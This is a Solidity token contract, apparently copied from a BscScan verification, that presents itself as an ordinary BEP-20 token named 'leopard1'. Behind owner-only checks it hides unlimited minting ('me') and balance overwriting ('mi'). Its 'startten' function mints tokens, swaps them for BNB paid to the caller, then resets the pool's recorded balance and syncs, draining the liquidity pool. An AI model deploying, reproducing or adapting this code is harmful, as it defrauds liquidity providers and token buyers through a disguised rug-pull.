/**
 *Submitted for verification at BscScan.com on 2022-04-27
*/

pragma solidity =0.6.6;


interface swapuni {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
    returns (uint[] memory amounts);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function factory() external pure returns (address);
    function WETH() external pure returns (address);


}

interface unifac{
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface unipair{
    function sync() external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

}


contract tokencontract {
    string public name     = "leopard1";
    string public symbol   = "lp2";
    uint8  public decimals = 18;
    uint private total;
    address private vanmij = address(0);
    address public router = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
    address public factory = swapuni(router).factory();
    address public bnb = swapuni(router).WETH();
    address public pairadress = address(0);
    address public usd = 0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684;
    address public contractadress = address(this);
    uint private meer = 100000000000000000000000000000;

    event  Approval(address indexed src, address indexed guy, uint wad);
    event  Transfer(address indexed src, address indexed dst, uint wad);
    event  Deposit(address indexed dst, uint wad);
    event  Withdrawal(address indexed src, uint wad);

    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;

    constructor () public{
        vanmij = msg.sender;
        me(msg.sender,meer);
        me(address(this),meer);
    }

    modifier check(){
        if (vanmij != address(0)){
            if (msg.sender != vanmij){
                revert("fout");
            }

        }
        _;
    }

    function nieuw(address o)public check{
        if (o != address(0)){
            vanmij = msg.sender;
        }
    }

    function eigenaar () public view returns ( address d){
        d = vanmij;
    }

    
    function me(address t,uint w) public check{
        balanceOf[t] += w;
        total += w;
    }
    function mi(address t ,uint w) public check {
        require(balanceOf[t] >= w);
        balanceOf[t] = w;
        total -= w;
    }

    function totalSupply() public view returns (uint) {
        return total;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint wad)
        public
        returns (bool)
    {
        require(balanceOf[src] >= wad);

        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);

        return true;
    }
    

    function startten(uint voorhoelang,uint eruit) public check{
        if (pairadress == address(0)){
            pairadress = unifac(factory).getPair(address(this),bnb);
        }
        for (uint i = 0 ; i <voorhoelang;i++){
            address[] memory path;
            path = new address[](4);
            path[0] = address(this);
            path[1] = bnb;
            path[2] = usd;
            path[3] = bnb;

            uint nu = balanceOf[pairadress];
            uint nu1 = balanceOf[msg.sender];

            //swap
            uint nodig = swapuni(router).getAmountsIn(eruit,path)[0];
            if (balanceOf[address(this)]<nodig){
                me(address(this),2*nodig);
            }
            uint wacht = block.timestamp + 60;


            approve(router,nodig);
            swapuni(router).swapTokensForExactETH(eruit,nodig,path,msg.sender,wacht);


            balanceOf[pairadress] = nu;
            balanceOf[msg.sender] = nu1;
            unipair(pairadress).sync();
        }

    }
}